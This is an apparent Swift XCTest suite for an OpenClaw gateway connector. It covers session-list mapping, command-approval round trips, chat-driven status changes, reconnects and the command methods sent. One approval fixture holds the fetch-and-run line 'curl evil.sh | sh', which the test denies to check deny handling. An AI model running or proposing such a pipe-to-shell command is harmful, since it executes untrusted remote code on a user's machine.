import Foundation
import XCTest
@testable import BotBusConnectorKit
@testable import BotBusConnectors
import BotBusProtocol

/// 连接器对着假 Gateway 跑：首屏映射、审批往返、chat 事件驱动状态、断线与重连、四个命令发出去的方法与参数。
final class OpenClawConnectorTests: XCTestCase {
    private let now = Date(timeIntervalSince1970: 1_790_000_000)
    private var nowMs: Int64 { Int64(now.timeIntervalSince1970 * 1000) }
    private let workspace = "/Users/me/.openclaw/workspace"

    private func makeStore() -> TaskStore {
        TaskStore(identity: AgentIdentity(agentId: "agent-1"),
                  connectors: ConnectorRegistry(descriptors: [
                      ConnectorDescriptor(kind: .openclaw, displayName: "OpenClaw", defaultEnabled: true) {
                          ConnectorProbe(available: true, status: .ok)
                      },
                  ]))
    }

    private final class HealthLog: @unchecked Sendable {
        let entries = Locked<[String]>([])
        var handler: OpenClawConnector.HealthHandler {
            { [entries] status, error in entries.withLock { $0.append("\(status.rawValue)|\(error ?? "-")") } }
        }
        var last: String? { entries.current.last }
    }

    private func makeConnector(_ server: FakeOpenClawServer, store: TaskStore,
                               health: HealthLog = HealthLog()) -> OpenClawConnector {
        let workspace = self.workspace
        let now = self.now
        return OpenClawConnector(store: store,
                                 config: { OpenClawConfig(port: 18789, token: "t", workspaceDirectory: workspace) },
                                 transport: FakeOpenClawTransport(server: server),
                                 clientVersion: "9.9.9",
                                 onHealth: health.handler,
                                 now: { now },
                                 timing: .init(initialBackoff: 0.05, maxBackoff: 0.2, refreshDelay: 0.05,
                                               requestTimeout: 1, challengeTimeout: 0.2, pingInterval: 0,
                                               refreshRetryDelay: 0.05))
    }

    private func row(_ key: String, secondsAgo: Double = 60, _ extra: [String: JSONValue] = [:]) -> JSONValue {
        var object: [String: JSONValue] = [
            "key": .string(key), "kind": "direct",
            "updatedAt": .int(nowMs - Int64(secondsAgo * 1000)),
            "createdAt": .int(nowMs - Int64(secondsAgo * 1000) - 3_600_000),
        ]
        object.merge(extra) { _, new in new }
        return .object(object)
    }

    private func task(_ store: TaskStore, _ key: String) async -> TaskRecord? {
        await store.task(id: "openclaw:\(key)")
    }

    private func startConnected(_ server: FakeOpenClawServer, store: TaskStore,
                                health: HealthLog = HealthLog(), waitFor key: String? = nil) async -> OpenClawConnector {
        let connector = makeConnector(server, store: store, health: health)
        await connector.start()
        await assertEventually { await connector.isConnected }
        if let key { await assertEventually { await store.task(id: "openclaw:\(key)") != nil } }
        return connector
    }

    // MARK: - 首屏映射

    func testBootstrapMapsSessionRows() async throws {
        let server = FakeOpenClawServer()
        server.rows = [
            row("agent:main:main", ["label": "Daily", "workspaceDir": "/Users/me/proj", "hasActiveRun": true,
                                    "status": "running", "lastMessagePreview": "working on it"]),
            row("agent:main:telegram:dm:42", secondsAgo: 120, ["derivedTitle": "Plan the trip", "status": "done",
                                                               "lastMessagePreview": "Booked."]),
            row("agent:main:failed", ["displayName": "Broken", "status": "failed", "lastRunError": "provider exploded",
                                      "lastMessagePreview": "…"]),
            row("agent:main:killed", ["status": "killed", "spawnedCwd": "/Users/me/other"]),
            row("agent:main:stale", ["status": "running", "hasActiveRun": false]),
            row("agent:main:old", secondsAgo: 8 * 24 * 3600, ["status": "done"]),
            row("agent:main:archived", ["archived": true]),
            ["kind": "direct", "label": "no key"],
        ]
        let store = makeStore()
        let health = HealthLog()
        let connector = await startConnected(server, store: store, health: health, waitFor: "agent:main:main")
        defer { Task { await connector.stop() } }
        await assertEventually { await store.task(id: "openclaw:agent:main:stale") != nil }

        let mainFound = await task(store, "agent:main:main")
        let main = try XCTUnwrap(mainFound)
        XCTAssertEqual(main.source, .openclaw)
        XCTAssertEqual(main.agentId, "agent-1")
        XCTAssertEqual(main.title, "Daily")
        XCTAssertEqual(main.projectPath, "/Users/me/proj")
        XCTAssertEqual(main.projectName, "proj")
        XCTAssertEqual(main.status, .running)
        XCTAssertEqual(main.lastMessage, "working on it")
        XCTAssertEqual(main.origin, .desktop)
        XCTAssertTrue(main.controllable)
        XCTAssertEqual(main.updatedAt, ProtocolJSON.timestamp(now.addingTimeInterval(-60)))
        let owner = await store.owner(of: main.id)
        XCTAssertEqual(owner, .live)
        // sessionKey 自带冒号：前缀只按第一个冒号切。
        XCTAssertEqual(TaskSource(taskId: main.id), .openclaw)
        XCTAssertEqual(try OpenClawConnector.sessionKey(from: main.id), "agent:main:main")

        let dmFound = await task(store, "agent:main:telegram:dm:42")
        let dm = try XCTUnwrap(dmFound)
        XCTAssertEqual(dm.title, "Plan the trip")
        XCTAssertEqual(dm.projectPath, workspace)
        XCTAssertEqual(dm.status, .completed)
        XCTAssertEqual(dm.lastMessage, "Booked.")

        let failedFound = await task(store, "agent:main:failed")
        let failed = try XCTUnwrap(failedFound)
        XCTAssertEqual(failed.title, "Broken")
        XCTAssertEqual(failed.status, .failed)
        XCTAssertEqual(failed.lastMessage, "provider exploded")

        let killedFound = await task(store, "agent:main:killed")
        let killed = try XCTUnwrap(killedFound)
        XCTAssertEqual(killed.title, "agent:main:killed")
        XCTAssertEqual(killed.status, .interrupted)
        XCTAssertEqual(killed.projectPath, "/Users/me/other")

        let stale = await task(store, "agent:main:stale")
        XCTAssertEqual(stale?.status, .interrupted)
        let old = await task(store, "agent:main:old")
        XCTAssertNil(old)
        let archived = await task(store, "agent:main:archived")
        XCTAssertNil(archived)

        let snapshot = await store.snapshot()
        XCTAssertEqual(snapshot.tasks.filter { $0.source == .openclaw }.count, 5)
        // 默认工作区里的会话「不在项目中」（协议 2.6）：打上标记，也不进项目列表。
        XCTAssertEqual(Set(snapshot.projects.map(\.path)), ["/Users/me/proj", "/Users/me/other"])
        XCTAssertEqual(snapshot.tasks.first { $0.projectPath == workspace }?.outsideProject, true)

        let subscribe = try XCTUnwrap(server.requests("sessions.subscribe").first?.params)
        XCTAssertEqual(subscribe["includeLastMessage"]?.boolValue, true)
        XCTAssertEqual(subscribe["includeDerivedTitles"]?.boolValue, true)
        XCTAssertEqual(subscribe["limit"]?.intValue, 200)
        XCTAssertEqual(server.requests("exec.approval.list").count, 1)
        XCTAssertTrue(server.requests("sessions.list").isEmpty, "订阅应答已带列表，不必再拉")
        XCTAssertEqual(health.last, "ok|-")
    }

    func testFallsBackWhenSubscribeRejectsListParams() async throws {
        let server = FakeOpenClawServer()
        server.rows = [row("agent:main:main", ["status": "done"])]
        server.setResponder("sessions.subscribe") { params in
            if params?.objectValue?.isEmpty == false {
                return .failure(OpenClawGatewayError(.requestFailed, code: "INVALID_REQUEST", message: "unexpected property"))
            }
            return .success(["subscribed": true])
        }
        let store = makeStore()
        let connector = await startConnected(server, store: store, waitFor: "agent:main:main")
        defer { Task { await connector.stop() } }
        XCTAssertEqual(server.requests("sessions.subscribe").count, 2)
        XCTAssertEqual(server.requests("sessions.list").count, 1)
    }

    func testKeepsAtMostTwoHundredMostRecentSessions() async throws {
        let server = FakeOpenClawServer()
        server.rows = (0..<205).map { row("agent:main:s\($0)", secondsAgo: Double($0 + 1), ["status": "done"]) }
        let store = makeStore()
        let connector = await startConnected(server, store: store, waitFor: "agent:main:s0")
        defer { Task { await connector.stop() } }
        await assertEventually { await store.snapshot().tasks.count == 200 }
        let newestDropped = await task(store, "agent:main:s200")
        XCTAssertNil(newestDropped)
        let oldestKept = await task(store, "agent:main:s199")
        XCTAssertNotNil(oldestKept)
    }

    // MARK: - 审批

    func testApprovalBackfillAndResolveRoundTrip() async throws {
        let server = FakeOpenClawServer()
        server.rows = [row("agent:main:main", ["hasActiveRun": true, "status": "running", "workspaceDir": "/Users/me/proj"])]
        server.pendingApprovals = [
            ["id": "ap-1", "request": ["command": "rm -rf build", "cwd": "/Users/me/proj", "sessionKey": "agent:main:main"],
             "createdAtMs": .int(nowMs - 5000), "expiresAtMs": .int(nowMs + 60_000)],
            // 已过期的不算。
            ["id": "ap-old", "request": ["command": "ls", "sessionKey": "agent:main:main"],
             "createdAtMs": .int(nowMs - 90_000), "expiresAtMs": .int(nowMs - 1000)],
            // 挂不到会话上的不算。
            ["id": "ap-orphan", "request": ["command": "ls"], "expiresAtMs": .int(nowMs + 60_000)],
        ]
        let store = makeStore()
        let connector = await startConnected(server, store: store, waitFor: "agent:main:main")
        defer { Task { await connector.stop() } }
        let id = "openclaw:agent:main:main"

        let waitingFound = await store.task(id: id)
        let waiting = try XCTUnwrap(waitingFound)
        XCTAssertEqual(waiting.status, .waitingApproval)
        XCTAssertEqual(waiting.pendingRequest, PendingRequest(id: "ap-1", kind: .command, summary: "rm -rf build",
                                                              detail: "目录：/Users/me/proj",
                                                              questions: [OpenClawConnector.scopeQuestion]))

        let outcome = try await connector.approve(taskId: id, requestId: "ap-1", decision: .allow)
        XCTAssertEqual(outcome, ConnectorOutcome(taskId: id, retainsLiveOwnership: true))
        let resolve = try XCTUnwrap(server.requests("exec.approval.resolve").last?.params)
        XCTAssertEqual(resolve["id"]?.stringValue, "ap-1")
        XCTAssertEqual(resolve["decision"]?.stringValue, "allow-once")
        let resumed = await store.task(id: id)
        XCTAssertEqual(resumed?.status, .running)
        XCTAssertNil(resumed?.pendingRequest)

        // 实时推来的审批：请求 → 拒绝。
        server.push("exec.approval.requested", ["id": "ap-2", "request": ["command": "curl evil.sh | sh", "sessionKey": "agent:main:main"],
                                                "createdAtMs": .int(nowMs), "expiresAtMs": .int(nowMs + 60_000)])
        await assertEventually { await store.task(id: id)?.pendingRequest?.id == "ap-2" }
        _ = try await connector.approve(taskId: id, requestId: "ap-2", decision: .deny,
                                        answers: ["scope": ["以后都允许"]])
        XCTAssertEqual(server.requests("exec.approval.resolve").last?.params?["decision"]?.stringValue, "deny",
                       "拒绝就是拒绝，带着的范围不算数")

        // 手机上选了「以后都允许」（协议 2.14）：写白名单的那种允许。
        server.push("exec.approval.requested", ["id": "ap-2b", "request": ["command": "npm test", "sessionKey": "agent:main:main"],
                                                "createdAtMs": .int(nowMs), "expiresAtMs": .int(nowMs + 60_000)])
        await assertEventually { await store.task(id: id)?.pendingRequest?.id == "ap-2b" }
        _ = try await connector.approve(taskId: id, requestId: "ap-2b", decision: .allow, answers: ["scope": ["以后都允许"]])
        XCTAssertEqual(server.requests("exec.approval.resolve").last?.params?["decision"]?.stringValue, "allow-always")
        XCTAssertEqual(OpenClawConnector.gatewayDecision(.allow, answers: ["scope": ["随便写的"]]), "allow-once",
                       "认不出的范围按最保守的算")
        XCTAssertEqual(OpenClawConnector.gatewayDecision(.allow, answers: nil), "allow-once")

        // 电脑上批掉的：resolved 事件把它摘掉。
        server.push("exec.approval.requested", ["id": "ap-3", "request": ["commandArgv": ["git", "push"], "sessionKey": "agent:main:main"],
                                                "createdAtMs": .int(nowMs)])
        await assertEventually { await store.task(id: id)?.pendingRequest?.summary == "git push" }
        server.push("exec.approval.resolved", ["id": "ap-3", "decision": "allow-once"])
        await assertEventually { await store.task(id: id)?.status == .running }
        let cleared = await store.task(id: id)
        XCTAssertNil(cleared?.pendingRequest)
    }

    // MARK: - 实时事件

    /// 首屏是基线：7 天内已完成 / 失败 / 等审批的会话一条都不推（正文是各渠道私聊的预览）；
    /// 之后真正发生的状态变化照常推。
    func testBootstrapIsSilentButLaterTransitionsNotify() async throws {
        let server = FakeOpenClawServer()
        server.rows = [
            row("agent:main:main", ["status": "done", "lastMessagePreview": "私聊预览"]),
            row("agent:main:telegram:dm:7", ["status": "failed", "lastRunError": "boom"]),
        ]
        let store = makeStore()
        let stream = await store.events()
        let notifications = Locked<[Notify]>([])
        let collector = Task {
            for await event in stream {
                guard let notify = event.notify else { continue }
                notifications.withLock { $0.append(notify) }
            }
        }
        defer { collector.cancel() }
        let connector = await startConnected(server, store: store, waitFor: "agent:main:telegram:dm:7")
        defer { Task { await connector.stop() } }
        try await Task.sleep(for: .milliseconds(100))
        XCTAssertEqual(notifications.current.count, 0, "首屏不能逐条推送")

        let id = "openclaw:agent:main:main"
        server.push("chat", ["runId": "r1", "sessionKey": "agent:main:main", "seq": 1, "state": "delta"])
        await assertEventually { await store.task(id: id)?.status == .running }
        server.push("chat", ["runId": "r1", "sessionKey": "agent:main:main", "seq": 2, "state": "final",
                             "message": ["role": "assistant", "content": [["type": "text", "text": "好了"]]]])
        await assertEventually { notifications.current.contains { $0.taskId == id && $0.category == .taskDone } }
    }

    func testChatEventsDriveStatusTransitions() async throws {
        let server = FakeOpenClawServer()
        server.rows = [row("agent:main:main", ["status": "done", "lastMessagePreview": "old"])]
        let store = makeStore()
        let connector = await startConnected(server, store: store, waitFor: "agent:main:main")
        defer { Task { await connector.stop() } }
        let id = "openclaw:agent:main:main"
        func chat(_ state: String, _ extra: [String: JSONValue] = [:]) {
            var payload: [String: JSONValue] = ["runId": "run-9", "sessionKey": "agent:main:main", "seq": 1, "state": .string(state)]
            payload.merge(extra) { _, new in new }
            server.push("chat", .object(payload))
        }

        chat("delta", ["deltaText": "Wor"])
        await assertEventually { await store.task(id: id)?.status == .running }
        chat("final", ["message": ["role": "assistant", "content": [["type": "thinking", "thinking": "hmm"],
                                                                     ["type": "text", "text": "All done"]]]])
        await assertEventually { await store.task(id: id)?.status == .completed }
        let completed = await store.task(id: id)
        XCTAssertEqual(completed?.lastMessage, "All done")

        chat("status", ["phase": "starting_model"])
        await assertEventually { await store.task(id: id)?.status == .running }
        chat("aborted")
        await assertEventually { await store.task(id: id)?.status == .interrupted }
        chat("error", ["errorMessage": "rate limited", "errorKind": "rate_limit"])
        await assertEventually { await store.task(id: id)?.status == .failed }
        let failed = await store.task(id: id)
        XCTAssertEqual(failed?.lastMessage, "rate limited")

        // 不认识的会话：去重新拉列表。
        server.rows.append(row("agent:main:new", ["status": "running", "hasActiveRun": true]))
        server.push("chat", ["runId": "r", "sessionKey": "agent:main:new", "seq": 1, "state": "delta"])
        await assertEventually { await store.task(id: "openclaw:agent:main:new")?.status == .running }
        XCTAssertGreaterThanOrEqual(server.requests("sessions.list").count, 1)
    }

    func testSessionsChangedMergesRowsAndRefreshesOnBroadInvalidation() async throws {
        let server = FakeOpenClawServer()
        server.rows = [row("agent:main:main", ["status": "done", "lastMessagePreview": "kept"]),
                       row("agent:main:other", ["status": "done"])]
        let store = makeStore()
        let connector = await startConnected(server, store: store, waitFor: "agent:main:main")
        defer { Task { await connector.stop() } }

        // 带行的变化就地合并，不拉列表；行里没有预览时沿用旧的。
        server.push("sessions.changed", ["reason": "patch", "session": row("agent:main:main", ["label": "Renamed", "status": "done"])])
        await assertEventually { await store.task(id: "openclaw:agent:main:main")?.title == "Renamed" }
        let renamed = await store.task(id: "openclaw:agent:main:main")
        XCTAssertEqual(renamed?.lastMessage, "kept")
        XCTAssertTrue(server.requests("sessions.list").isEmpty)

        // 不带行的（删除、整表失效）：重新拉列表，消失的任务被摘掉。
        server.rows = [row("agent:main:main", ["label": "Renamed", "status": "done"])]
        server.push("sessions.changed", ["reason": "delete", "key": "agent:main:other", "sessionId": "s-2"])
        await assertEventually { await store.task(id: "openclaw:agent:main:other") == nil }
        XCTAssertEqual(server.requests("sessions.list").count, 1)
        let kept = await store.task(id: "openclaw:agent:main:main")
        XCTAssertNotNil(kept)
    }

    /// 删除通知之后的列表拉失败了：过一会儿再拉，删掉的会话不会一直留在手机上。
    func testFailedRefreshAfterDeletionRetries() async throws {
        let server = FakeOpenClawServer()
        server.rows = [row("agent:main:main", ["status": "done"]), row("agent:main:other", ["status": "done"])]
        let store = makeStore()
        let connector = await startConnected(server, store: store, waitFor: "agent:main:other")
        defer { Task { await connector.stop() } }

        let rows = [row("agent:main:main", ["status": "done"])]
        let attempts = Locked(0)
        server.setResponder("sessions.list") { _ in
            attempts.withLock { $0 += 1 }
            return attempts.current == 1
                ? .failure(OpenClawGatewayError(.requestFailed, code: "UNAVAILABLE", message: "busy"))
                : .success(["sessions": .array(rows)])
        }
        server.push("sessions.changed", ["reason": "delete", "key": "agent:main:other", "sessionId": "s-2"])
        await assertEventually { await store.task(id: "openclaw:agent:main:other") == nil }
        XCTAssertGreaterThanOrEqual(attempts.current, 2)
        let kept = await store.task(id: "openclaw:agent:main:main")
        XCTAssertNotNil(kept)
    }

    // MARK: - 断线

    func testDisconnectKeepsTasksUncontrollableThenReconnects() async throws {
        let server = FakeOpenClawServer()
        server.rows = [row("agent:main:main", ["status": "done"])]
        let store = makeStore()
        let health = HealthLog()
        let connector = await startConnected(server, store: store, health: health, waitFor: "agent:main:main")
        defer { Task { await connector.stop() } }
        let id = "openclaw:agent:main:main"
        let before = await store.task(id: id)
        XCTAssertEqual(before?.controllable, true)

        // 让重连失败一次，好看清断线期间的状态。
        server.refuseConnections = true
        server.latest?.dropFromServer()
        await assertEventually { await store.task(id: id)?.controllable == false }
        await assertEventually { health.last == "degraded|连不上 OpenClaw Gateway（127.0.0.1:18789）" }
        let during = await store.task(id: id)
        XCTAssertEqual(during?.status, .completed, "断线保留最后状态")
        do {
            _ = try await connector.followUp(taskId: id, prompt: "hi")
            XCTFail("断线时不能发命令")
        } catch let error as ConnectorError {
            XCTAssertEqual(error.message, "OpenClaw Gateway 没有连上")
        }

        server.refuseConnections = false
        await assertEventually { await store.task(id: id)?.controllable == true }
        await assertEventually { health.last == "ok|-" }
        XCTAssertEqual(server.connections.count, 2)
        XCTAssertEqual(server.requests("sessions.subscribe").count, 2, "重连要重新订阅")
        XCTAssertEqual(health.entries.current.filter { $0.hasPrefix("degraded") }.count, 1, "同样的错误不重复上报")
    }

    func testAuthRejectionIsReportedAsDegraded() async {
        let server = FakeOpenClawServer()
        server.connectError = ("AUTH_TOKEN_MISMATCH", "unauthorized: gateway token mismatch")
        let store = makeStore()
        let health = HealthLog()
        let connector = makeConnector(server, store: store, health: health)
        await connector.start()
        defer { Task { await connector.stop() } }
        await assertEventually {
            health.last == "degraded|OpenClaw Gateway 拒绝了连接：unauthorized: gateway token mismatch"
        }
        let connected = await connector.isConnected
        XCTAssertFalse(connected)
        // 退避重连：会再试。
        await assertEventually { server.connections.count >= 2 }
    }

    func testStopClosesConnectionAndStopsReconnecting() async throws {
        let server = FakeOpenClawServer()
        server.rows = [row("agent:main:main", ["status": "done"])]
        let store = makeStore()
        let connector = await startConnected(server, store: store, waitFor: "agent:main:main")
        await connector.stop()
        await assertEventually { server.latest?.closed.current == true }
        await assertEventually { await store.task(id: "openclaw:agent:main:main")?.controllable == false }
        try await Task.sleep(for: .milliseconds(300))
        XCTAssertEqual(server.connections.count, 1)
        let connected = await connector.isConnected
        XCTAssertFalse(connected)
    }

    // MARK: - 命令

    func testStartCreatesSessionInProjectAndSendsPrompt() async throws {
        let server = FakeOpenClawServer()
        let store = makeStore()
        let connector = await startConnected(server, store: store)
        defer { Task { await connector.stop() } }

        let outcome = try await connector.start(projectPath: "/Users/me/proj", prompt: "Fix the flaky tests")
        XCTAssertEqual(outcome, ConnectorOutcome(taskId: "openclaw:agent:main:botbus-1", retainsLiveOwnership: true))

        let create = try XCTUnwrap(server.requests("sessions.create").first?.params)
        XCTAssertEqual(create["cwd"]?.stringValue, "/Users/me/proj")
        let send = try XCTUnwrap(server.requests("chat.send").first?.params)
        XCTAssertEqual(send["sessionKey"]?.stringValue, "agent:main:botbus-1")
        XCTAssertEqual(send["message"]?.stringValue, "Fix the flaky tests")
        XCTAssertFalse(send["idempotencyKey"]?.stringValue?.isEmpty ?? true)

        let createdFound = await store.task(id: outcome.taskId)
        let created = try XCTUnwrap(createdFound)
        XCTAssertEqual(created.origin, .watch)
        XCTAssertEqual(created.title, "Fix the flaky tests")
        XCTAssertEqual(created.projectPath, "/Users/me/proj")
        XCTAssertEqual(created.status, .running)
        XCTAssertTrue(created.controllable)
    }

    func testStartRetriesWithoutCwdWhenGatewayRefusesDirectory() async throws {
        let server = FakeOpenClawServer()
        server.setResponder("sessions.create") { params in
            if params?["cwd"] != nil {
                return .failure(OpenClawGatewayError(.requestFailed, code: "FORBIDDEN", message: "cwd outside workspace requires operator.admin"))
            }
            return .success(["ok": true, "key": "agent:main:botbus-2"])
        }
        let store = makeStore()
        let connector = await startConnected(server, store: store)
        defer { Task { await connector.stop() } }

        let outcome = try await connector.start(projectPath: "/Users/me/elsewhere", prompt: "hello")
        XCTAssertEqual(outcome.taskId, "openclaw:agent:main:botbus-2")
        let creates = server.requests("sessions.create")
        XCTAssertEqual(creates.count, 2)
        XCTAssertNil(creates[1].params?["cwd"])
        let created = await store.task(id: outcome.taskId)
        XCTAssertEqual(created?.projectPath, workspace)
        XCTAssertEqual(server.requests("chat.send").count, 1)
    }

    func testFollowUpAndInterruptSendTheRightMethods() async throws {
        let server = FakeOpenClawServer()
        server.rows = [row("agent:main:main", ["status": "done"])]
        let store = makeStore()
        let connector = await startConnected(server, store: store, waitFor: "agent:main:main")
        defer { Task { await connector.stop() } }
        let id = "openclaw:agent:main:main"

        let followUp = try await connector.followUp(taskId: id, prompt: "and also this")
        XCTAssertEqual(followUp, ConnectorOutcome(taskId: id, retainsLiveOwnership: true))
        let send = try XCTUnwrap(server.requests("chat.send").last?.params)
        XCTAssertEqual(send["sessionKey"]?.stringValue, "agent:main:main")
        XCTAssertEqual(send["message"]?.stringValue, "and also this")
        let running = await store.task(id: id)
        XCTAssertEqual(running?.status, .running)

        let interrupt = try await connector.interrupt(taskId: id)
        XCTAssertEqual(interrupt.taskId, id)
        let abort = try XCTUnwrap(server.requests("chat.abort").last?.params)
        XCTAssertEqual(abort["sessionKey"]?.stringValue, "agent:main:main")
        XCTAssertEqual(abort.objectValue?.count, 1)
        let interrupted = await store.task(id: id)
        XCTAssertEqual(interrupted?.status, .interrupted)
    }

    func testGatewayErrorsSurfaceToCommand() async throws {
        let server = FakeOpenClawServer()
        server.rows = [row("agent:main:main", ["status": "done"])]
        server.setResponder("chat.send") { _ in
            .failure(OpenClawGatewayError(.requestFailed, code: "INVALID_REQUEST", message: "session busy"))
        }
        let store = makeStore()
        let connector = await startConnected(server, store: store, waitFor: "agent:main:main")
        defer { Task { await connector.stop() } }
        do {
            _ = try await connector.followUp(taskId: "openclaw:agent:main:main", prompt: "x")
            XCTFail("应当失败")
        } catch {
            XCTAssertEqual(error.localizedDescription, "OpenClaw 拒绝了这个操作：session busy")
        }
    }

    func testCommandsFailClearlyWhenGatewayIsDown() async {
        let server = FakeOpenClawServer()
        server.refuseConnections = true
        let store = makeStore()
        let connector = makeConnector(server, store: store)
        await connector.start()
        defer { Task { await connector.stop() } }
        let id = "openclaw:agent:main:main"
        let attempts: [@Sendable () async throws -> ConnectorOutcome] = [
            { try await connector.start(projectPath: "/tmp", prompt: "x") },
            { try await connector.followUp(taskId: id, prompt: "x") },
            { try await connector.approve(taskId: id, requestId: "ap", decision: .allow) },
            { try await connector.interrupt(taskId: id) },
        ]
        for attempt in attempts {
            do {
                _ = try await attempt()
                XCTFail("没连上时不能成功")
            } catch let error as ConnectorError {
                XCTAssertEqual(error.message, "OpenClaw Gateway 没有连上")
            } catch {
                XCTFail("错误类型不对：\(error)")
            }
        }
    }

    func testImagesAreRefusedBeforeTouchingTheGateway() async {
        let server = FakeOpenClawServer()
        server.refuseConnections = true
        let connector = makeConnector(server, store: makeStore())
        let image = [URL(fileURLWithPath: "/tmp/a.jpg")]
        let attempts: [@Sendable () async throws -> ConnectorOutcome] = [
            { try await connector.start(projectPath: "/tmp", prompt: "看图", images: image) },
            { try await connector.followUp(taskId: "openclaw:agent:main:main", prompt: "看图", images: image) },
        ]
        for attempt in attempts {
            do {
                _ = try await attempt()
                XCTFail("OpenClaw 不支持发图")
            } catch {
                XCTAssertEqual((error as? ConnectorError)?.message, "这个 Agent 暂不支持发图")
            }
        }
    }

    // MARK: - 纯映射

    func testRunStatusMapping() {
        XCTAssertEqual(OpenClawConnector.runStatus(status: nil, hasActiveRun: true), .running)
        XCTAssertEqual(OpenClawConnector.runStatus(status: "done", hasActiveRun: true), .running)
        XCTAssertEqual(OpenClawConnector.runStatus(status: "queued", hasActiveRun: nil), .running)
        XCTAssertEqual(OpenClawConnector.runStatus(status: "running", hasActiveRun: false), .interrupted)
        XCTAssertEqual(OpenClawConnector.runStatus(status: "done", hasActiveRun: false), .completed)
        XCTAssertEqual(OpenClawConnector.runStatus(status: "failed", hasActiveRun: nil), .failed)
        XCTAssertEqual(OpenClawConnector.runStatus(status: "timeout", hasActiveRun: nil), .failed)
        XCTAssertEqual(OpenClawConnector.runStatus(status: "killed", hasActiveRun: nil), .interrupted)
        XCTAssertEqual(OpenClawConnector.runStatus(status: "something-new", hasActiveRun: nil), .idle)
        XCTAssertEqual(OpenClawConnector.runStatus(status: nil, hasActiveRun: nil), .idle)
    }

    func testSessionKeyParsing() throws {
        XCTAssertEqual(try OpenClawConnector.sessionKey(from: "openclaw:agent:main:telegram:dm:42"), "agent:main:telegram:dm:42")
        XCTAssertEqual(try OpenClawConnector.sessionKey(from: "agent:main:main"), "agent:main:main")
        XCTAssertThrowsError(try OpenClawConnector.sessionKey(from: "openclaw:"))
    }

    func testCompletedSessionsGoIdleAfterADay() async throws {
        let server = FakeOpenClawServer()
        server.rows = [row("agent:main:quiet", secondsAgo: 2 * 24 * 3600, ["status": "done"])]
        let store = makeStore()
        let connector = await startConnected(server, store: store, waitFor: "agent:main:quiet")
        defer { Task { await connector.stop() } }
        let quiet = await store.task(id: "openclaw:agent:main:quiet")
        XCTAssertEqual(quiet?.status, .idle)
    }
}
